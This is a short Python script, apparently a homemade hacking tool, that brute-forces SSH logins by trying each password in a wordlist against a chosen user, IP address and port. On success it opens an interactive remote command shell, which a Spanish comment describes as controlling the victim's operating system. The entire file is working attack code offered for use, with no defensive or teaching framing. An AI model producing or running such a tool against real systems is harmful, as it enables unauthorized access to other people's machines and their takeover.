try:
  from pwn import *
except:
     print("Install pwntools.")
try:
   import paramiko 
except:
    print("Install paramiko.")     
print("For better comfort when being in ssh, I recommend opening it directly.")    
#controlar el sistema operativo de la victima
def shell(user,ip,password_,port_):
  ssh_shell = ssh(user,ip,password=password_,port=port_) 
  print("Ctrl + c for exit.")
  try:
   while True:
        command_ssh = input("Command>>")
        print(ssh_shell[command_ssh].decode())
  except KeyboardInterrupt:
        print("Ctrl + c...")
        print("Thanks for proof.")   
        exit()  
   
def attack_wordlist(user,ip,port_,wordlist_password):
   with open(wordlist_password.replace("\n","")) as wordlist:
        password_ = wordlist.readlines(0)
   count = 0   
   while True:  
     try:
        connect_ssh = ssh(user,ip,password=password_[count].replace("\n",""),port=port_)
        shell(user,ip,password_[count].replace("\n",""),port_) 
     except IndexError:
          print("Finished.")
          exit()  
     except EOFError:    
           print("Error.")
     except paramiko.ssh_exception.AuthenticationException:
           print("Error.")      
     except paramiko.ssh_exception.SSHException:
           print("Error.")      
     count += 1
print("\n1.Attack of wordlist(user recognize)") 
while True:
  try: 
     option = int(input("Option:"))         
     if option == 1:
        user_attack = input("User:")      
        ip_attack = input("IP:")
        port_attack = int(input("Port:"))
        password_attack = input("Wordlist password:")  
        user_attack = user_attack.replace("\n","")
        ip_attack = ip_attack.replace("\n","")
        password_attack = password_attack.replace("\n","")
        attack_wordlist(user_attack,ip_attack,port_attack,password_attack)
     
           
  except KeyboardInterrupt:
       print("ctrl + c...")
       print("Thanks for proof.")
       exit()


 
